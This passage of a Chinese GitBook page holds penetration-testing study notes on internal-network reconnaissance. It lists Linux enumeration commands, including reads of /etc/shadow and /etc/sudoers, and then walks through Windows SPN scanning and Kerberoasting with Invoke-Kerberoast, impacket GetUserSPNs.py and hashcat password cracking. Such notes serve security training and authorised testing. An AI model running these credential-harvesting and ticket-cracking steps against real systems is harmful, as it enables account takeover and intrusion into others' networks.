</li>
<li><p>&#x4E3B;&#x673A;&#x540D; <code>hostname</code></p>
</li>
<li><p>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF; <code>df -a</code></p>
</li>
<li><p>&#x5185;&#x6838;&#x65E5;&#x5FD7; <code>dmesg</code> / <code>/var/log/dmesg</code></p>
</li>
</ul>
<h4 id="&#x7528;&#x6237;&#x548C;&#x7EC4;">&#x7528;&#x6237;&#x548C;&#x7EC4;</h4>
<ul>
<li><p>&#x5217;&#x51FA;&#x7CFB;&#x7EDF;&#x6240;&#x6709;&#x7528;&#x6237; <code>cat /etc/passwd</code></p>
</li>
<li><p>&#x5217;&#x51FA;&#x7CFB;&#x7EDF;&#x6240;&#x6709;&#x7EC4; <code>cat /etc/group</code></p>
</li>
<li><p>&#x5217;&#x51FA;&#x6240;&#x6709;&#x7528;&#x6237;hash&#xFF08;root&#xFF09;<code>cat /etc/shadow</code></p>
</li>
<li><ul>
<li><p>&#x7528;&#x6237;</p>
<p>&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x7684;&#x57FA;&#x672C;&#x4FE1;&#x606F; <code>finger</code>&#x5F53;&#x524D;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237; <code>users</code> <code>who -a</code> <code>/var/log/utmp</code>&#x67E5;&#x8BE2;&#x65E0;&#x5BC6;&#x7801;&#x7528;&#x6237; <code>grep &apos;x:0:&apos; /etc/passwd</code></p>
</li>
</ul>
</li>
<li><p>&#x76EE;&#x524D;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237; <code>w</code></p>
</li>
<li><p>&#x767B;&#x5165;&#x8FC7;&#x7684;&#x7528;&#x6237;&#x4FE1;&#x606F; <code>last</code> / <code>/var/log/wtmp</code></p>
</li>
<li><p>&#x663E;&#x793A;&#x7CFB;&#x7EDF;&#x4E2D;&#x6240;&#x6709;&#x7528;&#x6237;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x767B;&#x5F55;&#x4FE1;&#x606F; <code>lastlog</code> / <code>/var/log/lastlog</code></p>
</li>
<li><p>&#x767B;&#x5F55;&#x6210;&#x529F;&#x65E5;&#x5FD7; <code>/var/log/secure</code></p>
</li>
<li><p>&#x767B;&#x5F55;&#x5931;&#x8D25;&#x65E5;&#x5FD7; <code>/var/log/faillog</code></p>
</li>
<li><p>&#x67E5;&#x770B;&#x7279;&#x6743;&#x7528;&#x6237; <code>grep :0 /etc/passwd</code></p>
</li>
<li><p>&#x67E5;&#x770B;passwd&#x6700;&#x540E;&#x4FEE;&#x6539;&#x65F6;&#x95F4; <code>ls -l /etc/passwd</code></p>
</li>
<li><p>&#x67E5;&#x770B;&#x662F;&#x5426;&#x5B58;&#x5728;&#x7A7A;&#x53E3;&#x4EE4;&#x7528;&#x6237; <code>awk -F: &apos;length($2)==0 {print $1}&apos; /etc/shadow</code></p>
</li>
<li><p>&#x67E5;&#x770B;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x7684;&#x8D26;&#x53F7; <code>awk &apos;/\$1|\$6/{print $1}&apos; /etc/shadow</code></p>
</li>
<li><ul>
<li><p>&#x67E5;&#x770B;&#x5177;&#x6709;sudo&#x6743;&#x9650;&#x7684;&#x7528;&#x6237;</p>
<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
</li>
</ul>
</li>
</ul>
<h4 id="&#x7528;&#x6237;&#x548C;&#x6743;&#x9650;&#x4FE1;&#x606F;">&#x7528;&#x6237;&#x548C;&#x6743;&#x9650;&#x4FE1;&#x606F;</h4>
<ul>
<li>&#x5F53;&#x524D;&#x7528;&#x6237; <code>whoami</code></li>
<li>&#x5F53;&#x524D;&#x7528;&#x6237;&#x4FE1;&#x606F; <code>id</code></li>
<li>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;sudo&#x63D0;&#x5347;&#x5230;root&#x7684;&#x7528;&#x6237;&#xFF08;root&#xFF09; <code>cat /etc/sudoers</code></li>
<li>&#x5217;&#x51FA;&#x76EE;&#x524D;&#x7528;&#x6237;&#x53EF;&#x6267;&#x884C;&#x4E0E;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4; <code>sudo -l</code></li>
</ul>
<h4 id="&#x73AF;&#x5883;&#x4FE1;&#x606F;">&#x73AF;&#x5883;&#x4FE1;&#x606F;</h4>
<ul>
<li>&#x6253;&#x5370;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x4FE1;&#x606F; <code>env</code></li>
<li>&#x6253;&#x5370;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x4FE1;&#x606F; <code>set</code></li>
<li>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;&#x7684;&#x8DEF;&#x5F84;&#x4FE1;&#x606F; <code>echo  $PATH</code></li>
<li>&#x6253;&#x5370;&#x5386;&#x53F2;&#x547D;&#x4EE4; <code>history</code> / <code>~/.bash_history</code></li>
<li>&#x663E;&#x793A;&#x5F53;&#x524D;&#x8DEF;&#x5F84; <code>pwd</code></li>
<li>&#x663E;&#x793A;&#x9ED8;&#x8BA4;&#x7CFB;&#x7EDF;&#x904D;&#x5386; <code>cat /etc/profile</code></li>
<li>&#x663E;&#x793A;&#x53EF;&#x7528;&#x7684;shell <code>cat /etc/shells</code></li>
</ul>
<h4 id="&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;">&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;</h4>
<ul>
<li>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F; <code>ps aux</code></li>
<li>&#x8D44;&#x6E90;&#x5360;&#x6709;&#x60C5;&#x51B5; <code>top -c</code></li>
<li>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#x5173;&#x8054;&#x6587;&#x4EF6; <code>lsof -c $PID</code></li>
<li>&#x5B8C;&#x6574;&#x547D;&#x4EE4;&#x884C;&#x4FE1;&#x606F; <code>/proc/$PID/cmdline</code></li>
<li>&#x8FDB;&#x7A0B;&#x7684;&#x547D;&#x4EE4;&#x540D; <code>/proc/$PID/comm</code></li>
<li>&#x8FDB;&#x7A0B;&#x5F53;&#x524D;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x7684;&#x7B26;&#x53F7;&#x94FE;&#x63A5; <code>/proc/$PID/cwd</code></li>
<li>&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x7B26;&#x53F7;&#x94FE;&#x63A5; <code>/proc/$PID/exe</code></li>
<li>&#x8FDB;&#x7A0B;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF; <code>/proc/$PID/environ</code></li>
<li>&#x8FDB;&#x7A0B;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7684;&#x60C5;&#x51B5; <code>/proc/$PID/fd</code></li>
</ul>
<h4 id="&#x670D;&#x52A1;&#x4FE1;&#x606F;">&#x670D;&#x52A1;&#x4FE1;&#x606F;</h4>
<ul>
<li>&#x7531;inetd&#x7BA1;&#x7406;&#x7684;&#x670D;&#x52A1;&#x5217;&#x8868; <code>cat /etc/inetd.conf</code></li>
<li>&#x7531;xinetd&#x7BA1;&#x7406;&#x7684;&#x670D;&#x52A1;&#x5217;&#x8868; <code>cat /etc/xinetd.conf</code></li>
<li>nfs&#x670D;&#x52A1;&#x5668;&#x7684;&#x914D;&#x7F6E; <code>cat /etc/exports</code></li>
<li>&#x90AE;&#x4EF6;&#x4FE1;&#x606F; <code>/var/log/mailog</code></li>
<li>ssh&#x914D;&#x7F6E; <code>sshd_config</code></li>
</ul>
<h4 id="&#x8BA1;&#x5212;&#x4EFB;&#x52A1;">&#x8BA1;&#x5212;&#x4EFB;&#x52A1;</h4>
<ul>
<li>&#x663E;&#x793A;</li>
</ul>
<h3 id="&#x4FE1;&#x606F;&#x6536;&#x96C6;">&#x4FE1;&#x606F;&#x6536;&#x96C6;</h3>
<h4 id="spn&#x63A2;&#x9488;">SPN&#x63A2;&#x9488;</h4>
<p>SPN&#x626B;&#x63CF;&#x4E0D;&#x9700;&#x8981;&#x8FDE;&#x63A5;&#x5230;&#x57DF;&#x5185;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x6BCF;&#x4E2A;IP&#x5373;&#x53EF;&#x68C0;&#x67E5;&#x670D;&#x52A1;&#x7AEF;&#x53E3;&#x3002;SPN&#x626B;&#x63CF;&#x901A;&#x8FC7;&#x5BF9;&#x57DF;&#x63A7;&#x5236;&#x5668;&#x7684;LDAP&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x670D;&#x52A1;&#x53D1;&#x73B0;&#x3002;&#x7531;&#x4E8E;SPN&#x67E5;&#x8BE2;&#x662F;&#x6B63;&#x5E38;Kerberos&#x7968;&#x8BC1;&#x884C;&#x4E3A;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x56E0;&#x6B64;&#x5373;&#x4F7F;&#x662F;&#x653B;&#x51FB;&#x8005;&#xFF0C;&#x68C0;&#x6D4B;&#x4E5F;&#x5F88;&#x96BE;&#x53D1;&#x73B0;&#x662F;&#x5584;&#x610F;&#x8FD8;&#x662F;&#x6076;&#x610F;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x800C;network&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x975E;&#x5E38;&#x660E;&#x663E;&#x3002;</p>
<h5 id="spn-&#x683C;&#x5F0F;&#x4E0E;&#x914D;&#x7F6E;">SPN &#x683C;&#x5F0F;&#x4E0E;&#x914D;&#x7F6E;</h5>
<pre><code class="lang-powershell">&lt;serviceclass&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;

&lt;service class&gt;&#xFF1A;&#x6807;&#x8BC6;&#x670D;&#x52A1;&#x7C7B;&#x7684;&#x5B57;&#x7B26;&#x4E32;

&lt;host&gt;&#xFF1A;&#x670D;&#x52A1;&#x6240;&#x5728;&#x4E3B;&#x673A;&#x540D;&#x79F0;

&lt;port&gt;&#xFF1A;&#x670D;&#x52A1;&#x7AEF;&#x53E3;

&lt;service name&gt;&#xFF1A;&#x670D;&#x52A1;&#x540D;&#x79F0;
</code></pre>
<p>&#x4F8B;&#xFF1A;</p>
<p>&#x4E3A; SQL Server &#x670D;&#x52A1;&#x5E10;&#x6237;&#x6CE8;&#x518C;SPN</p>
<p>&#x624B;&#x52A8;&#x6CE8;&#x518C;&#xFF1A;</p>
<pre><code class="lang-powershell">setspn -A MSSQLSvc/myhost.redmond.microsoft.com:<span class="hljs-number">1433</span> accountname
</code></pre>
<p>&#x5BF9;&#x5E94;&#x7684;&#x547D;&#x540D;&#x5B9E;&#x4F8B;&#xFF1A;</p>
<pre><code class="lang-powershell">setspn -A MSSQLSvc/myhost.redmond.microsoft.com/instancename accountname
</code></pre>
<p>&#x5982;&#x679C;&#x6211;&#x60F3;&#x628A;&#x57DF;&#x4E2D;&#x4E00;&#x53F0;&#x4E3B;&#x673A;Srv-DB-0day&#x4E2D;&#x7684; MSSQL &#x670D;&#x52A1;&#x6CE8;&#x518C;&#x5230; SPN &#x4E2D;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#xFF1A;</p>
<pre><code class="lang-powershell">setspn -A MSSQLSvc/Srv-DB-<span class="hljs-number">0</span>day.Oday.org:<span class="hljs-number">1433</span> sqladmin
</code></pre>
<p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x4E24;&#x4E2A;&#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x6CE8;&#x518C;&#x7684; SPN&#x3002;</p>
<pre><code>setspn -q */* 
setspn -T 0day.org -q */*
</code></pre><h5 id="spn&#x626B;&#x63CF;">SPN&#x626B;&#x63CF;</h5>
<pre><code class="lang-powershell">Discover-PSMSSQLServers:  &#x662F; Powershell-AD-Recon &#x5DE5;&#x5177;&#x96C6;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x7528;&#x6765;&#x67E5;&#x8BE2;&#x5DF2;&#x7ECF;&#x6CE8;&#x518C;&#x4E86;&#x7684; MSSQL &#x7C7B;&#x578B;&#x7684; SPN&#x3002;
GetUserSPNs.ps1:          &#x662F; Kerberoast &#x5DE5;&#x5177;&#x96C6;&#x4E2D;&#x7684;&#x4E00;&#x4E2A; powershell &#x811A;&#x672C;&#xFF0C;&#x7528;&#x6765;&#x67E5;&#x8BE2;&#x57DF;&#x5185;&#x6CE8;&#x518C;&#x7684; SPN
PowerView.ps1:            &#x5728; Powersploit &#x548C; Empire &#x5DE5;&#x5177;&#x91CC;&#x90FD;&#x6709;&#x96C6;&#x6210;&#xFF0C;PowerView &#x76F8;&#x5BF9;&#x4E8E;&#x4E0A;&#x9762;&#x51E0;&#x79CD;&#x662F;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7528;&#x6237;&#x7684; objectsid &#x6765;&#x8FD4;&#x56DE;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x4FE1;&#x606F;&#x66F4;&#x52A0;&#x8BE6;&#x7EC6;&#x3002;
</code></pre>
<h5 id="ldap">LDAP</h5>
<p>LDAP &#x534F;&#x8BAE;&#x5168;&#x79F0;&#x662F; LightweightDirectory Access Protocol&#xFF0C;&#x4E00;&#x822C;&#x7FFB;&#x8BD1;&#x6210;&#x8F7B;&#x91CF;&#x76EE;&#x5F55;&#x8BBF;&#x95EE;&#x534F;&#x8BAE;&#x3002;&#x662F;&#x4E00;&#x79CD;&#x7528;&#x6765;&#x67E5;&#x8BE2;&#x4E0E;&#x66F4;&#x65B0; Active Directory &#x7684;&#x76EE;&#x5F55;&#x670D;&#x52A1;&#x901A;&#x4FE1;&#x534F;&#x8BAE;&#x3002;AD &#x57DF;&#x670D;&#x52A1;&#x5229;&#x7528; LDAP &#x547D;&#x540D;&#x8DEF;&#x5F84;&#xFF08;LDAP naming path&#xFF09;&#x6765;&#x8868;&#x793A;&#x5BF9;&#x8C61;&#x5728; AD &#x5185;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4EE5;&#x4FBF;&#x7528;&#x5B83;&#x6765;&#x8BBF;&#x95EE; AD &#x5185;&#x7684;&#x5BF9;&#x8C61;&#x3002;</p>
<p>LDAP &#x6570;&#x636E;&#x7684;&#x7EC4;&#x7EC7;&#x65B9;&#x5F0F;&#xFF1A;</p>
<p><a href="https://imgtu.com/i/oaSpjI" target="_blank"><img src="https://z3.ax1x.com/2021/12/03/oaSpjI.png" alt="oaSpjI.png"></a></p>
<p>&#x66F4;&#x76F4;&#x89C2;&#x7684;&#x8BF4;&#x53EF;&#x4EE5;&#x628A; LDAP &#x534F;&#x8BAE;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x4E2A;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5176;&#x4E2D;&#x5B58;&#x50A8;&#x4E86;&#x57DF;&#x5185;&#x4E3B;&#x673A;&#x7684;&#x5404;&#x79CD;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#x3002;</p>
<p>&#x5728;&#x57DF;&#x63A7;&#x4E2D;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x4E86; ADSI &#x7F16;&#x8F91;&#x5668;&#xFF0C;&#x5168;&#x79F0; ActiveDirectory Service Interfaces Editor (ADSI Edit)&#xFF0C;&#x662F;&#x4E00;&#x79CD; LDAP &#x7684;&#x7F16;&#x8F91;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x57DF;&#x63A7;&#x4E2D;&#x8FD0;&#x884C; adsiedit.msc &#x6765;&#x6253;&#x5F00;&#xFF08;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x90FD;&#x6709;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x57DF;&#x63A7;&#x4E2D;&#x7684;&#x6709;&#x6574;&#x4E2A;&#x57DF;&#x5185;&#x7684;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#xFF09;&#x3002;</p>
<p>&#x901A;&#x8FC7; adsiedit.msc &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x548C;&#x7F16;&#x8F91; LADP&#xFF0C;&#x5728; SPN &#x67E5;&#x8BE2;&#x65F6;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x67E5;&#x8BE2; LADP &#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
<h5 id="kerberoasting">kerberoasting</h5>
<h6 id="&#x653B;&#x51FB;&#x65B9;&#x5F0F;1">&#x653B;&#x51FB;&#x65B9;&#x5F0F;1</h6>
<p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6709;&#x4E86;SPN&#x7684;&#x6CE8;&#x518C;&#x6743;&#x9650;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7ED9;&#x6307;&#x5B9A;&#x7684;&#x57DF;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;SPN&#xFF0C;&#x7136;&#x540E;&#x83B7;&#x53D6;&#x5230;TGS&#xFF0C;&#x7136;&#x540E;&#x7834;&#x89E3;&#x5F97;&#x5230;&#x5BC6;&#x7801;</p>
<p>&#x5728; TGS_REP &#x4E2D;&#xFF0C;TGS &#x4F1A;&#x8FD4;&#x56DE;&#x7ED9; Client &#x4E00;&#x5F20;&#x7968;&#x636E; ST&#xFF0C;&#x800C; ST &#x662F;&#x7531; Client &#x8BF7;&#x6C42;&#x7684; Server &#x7AEF;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x7684;&#x3002;&#x5F53; Kerberos &#x534F;&#x8BAE;&#x8BBE;&#x7F6E;&#x7968;&#x636E;&#x4E3A; RC4 &#x65B9;&#x5F0F;&#x52A0;&#x5BC6;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7206;&#x7834;&#x5728; Client &#x7AEF;&#x83B7;&#x53D6;&#x7684;&#x7968;&#x636E; ST&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x5F97; Server &#x7AEF;&#x7684;&#x5BC6;&#x7801;</p>
<ol>
<li>&#x9996;&#x5148;&#x7528;SPN&#x626B;&#x63CF;</li>
<li>&#x6839;&#x636E;&#x626B;&#x63CF;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x4F7F;&#x7528;&#x5FAE;&#x8F6F;&#x63D0;&#x4F9B;&#x7684;&#x7C7B; Kerberos Requestor Security Token &#x53D1;&#x8D77; kerberos &#x8BF7;&#x6C42;&#xFF0C;&#x7533;&#x8BF7; ST &#x7968;&#x636E;</li>
</ol>
<pre><code class="lang-powershell">PS C:\&gt; Add-Type -AssemblyNameSystem.IdentityModel
PS C:\&gt; New-ObjectSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList<span class="hljs-string">&quot;MSSQLSvc/s2:1433&quot;</span>
</code></pre>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x901A;&#x8FC7;AS-REQ&#x3001;AS-REP&#x3001;TGS-REQ&#x3001;TGS-REP&#x8FD9;&#x56DB;&#x4E2A;&#x8BA4;&#x8BC1;&#x6D41;&#x7A0B;&#xFF0C;&#x83B7;&#x53D6;&#x5230; RC4 &#x65B9;&#x5F0F;&#x52A0;&#x5BC6;&#x7684;&#x7968;&#x636E;</p>
<ol>
<li>Kerberos &#x534F;&#x8BAE;&#x4E2D;&#x8BF7;&#x6C42;&#x7684;&#x7968;&#x636E;&#x4F1A;&#x4FDD;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; klist &#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#x5B58;&#x50A8;&#x7684; kerberos &#x7968;&#x636E;</li>
</ol>
<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x501F;&#x52A9; mimikatz &#x5BFC;&#x51FA;&#xFF0C;&#x4F7F;&#x7528; kerberoast &#x5DE5;&#x5177;&#x96C6;&#x4E2D;&#x7684; tgsrepcrack.py &#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x79BB;&#x7EBF;&#x7206;&#x7834;&#xFF0C;&#x6210;&#x529F;&#x5F97;&#x5230; tsvc &#x8D26;&#x53F7;&#x7684;&#x5BC6;&#x7801; admin1234!</p>
<h6 id="&#x653B;&#x51FB;&#x65B9;&#x5F0F;2">&#x653B;&#x51FB;&#x65B9;&#x5F0F;2</h6>
<p>Kerberoasting&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x4E00;&#x4E2D;&#x9700;&#x8981;&#x901A;&#x8FC7; mimikatz &#x4ECE;&#x5185;&#x5B58;&#x4E2D;&#x5BFC;&#x51FA;&#x7968;&#x636E;&#xFF0C;Invoke-Kerberoast &#x901A;&#x8FC7;&#x63D0;&#x53D6;&#x7968;&#x636E;&#x4F20;&#x8F93;&#x65F6;&#x7684;&#x539F;&#x59CB;&#x5B57;&#x8282;&#xFF0C;&#x8F6C;&#x6362;&#x6210; John the Ripper &#x6216;&#x8005; HashCat &#x80FD;&#x591F;&#x76F4;&#x63A5;&#x7206;&#x7834;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
<p>&#x4F7F;&#x7528; Invoke-Kerberoast &#x811A;&#x672C; (&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x7684;&#x662F; Empire &#x4E2D;&#x7684; Invoke-Kerberoast.ps1)</p>
<pre><code>Import-module Invoke-Kerberoast.ps1
Invoke-kerberoast -outputformat hashcat |fl
</code></pre><p>&#x4F7F;&#x7528; HASHCAT &#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x7834;&#x89E3;</p>
<pre><code>PSC:&gt; hashcat64.exe &#x2013;m 13100 test1.txt password.list --force
</code></pre><h5 id="impacket-&#x8FDB;&#x884C;kerberoasting">Impacket &#x8FDB;&#x884C;Kerberoasting</h5>
<p>&#x8FD9;&#x91CC;&#x8981;&#x7528;&#x5230;<strong>impacket</strong>&#x5DE5;&#x5177;&#x5305;&#xFF0C;&#x8BE5;&#x5DE5;&#x5177;&#x5305;&#x7528;&#x4E8E;&#x5BF9;SMB1-3&#x6216;IPv4 / IPv6 &#x4E0A;&#x7684;TCP&#x3001;UDP&#x3001;ICMP&#x3001;IGMP&#xFF0C;ARP&#xFF0C;IPv4&#xFF0C;IPv6&#xFF0C;SMB&#xFF0C;MSRPC&#xFF0C;NTLM&#xFF0C;Kerberos&#xFF0C;WMI&#xFF0C;LDAP&#x7B49;&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x4F4E;&#x7EA7;&#x7F16;&#x7A0B;&#x8BBF;&#x95EE;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x7684;&#x662F;GetUserSPNs&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x4F7F;&#x7528;&#x8BE5;&#x5DE5;&#x5177;&#x5BF9;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x8FDB;&#x884C;SPN&#x63A2;&#x6D4B;</p>
<pre><code class="lang-http">https://github.com/SecureAuthCorp/impacket               &#x5B98;&#x65B9;&#x4ED3;&#x5E93;https://github.com/maaaaz/impacket-examples-windows      &#x6709;&#x4EBA;&#x5DF2;&#x5C06;&#x5404;&#x4E2A;&#x811A;&#x672C;&#x6253;&#x5305;&#x6210;&#x76F8;&#x5E94;&#x7684;exe,&#x6B64;&#x5904;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x4E5F;&#x90FD;&#x5C06;&#x5168;&#x90E8;&#x7528;&#x8FD9;&#x4E9B;exe&#x5355;&#x6587;&#x4EF6;&#x6765;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;
</code></pre>
<p>&#x547D;&#x4EE4;</p>
<pre><code class="lang-python">python GetUserSPNs.py -request -dc-ip x.x.x.x &#x57DF;&#x540D;&#x79F0;/&#x57DF;&#x7528;&#x6237;
</code></pre>
<pre><code>hashcat64.exe &#x2013;m 13100 test1.txt password.list --force
</code></pre>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="privilege.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: 权限提升">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"横向移动，代理隧道","level":"5.2","depth":1,"next":{"title":"[权限维持]","level":"5.3","depth":1,"ref":"","articles":[{"title":"渗透面试题","level":"5.3.1","depth":2,"path":"thinkphp/pentest.md","ref":"thinkphp/pentest.md","articles":[]}]},"previous":{"title":"权限提升","level":"5.1","depth":1,"path":"neiwang/privilege.md","ref":"neiwang/privilege.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr"],"pluginsConfig":{"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"neiwang/information.md","mtime":"2023-09-28T05:40:57.043Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-10-10T04:29:36.564Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

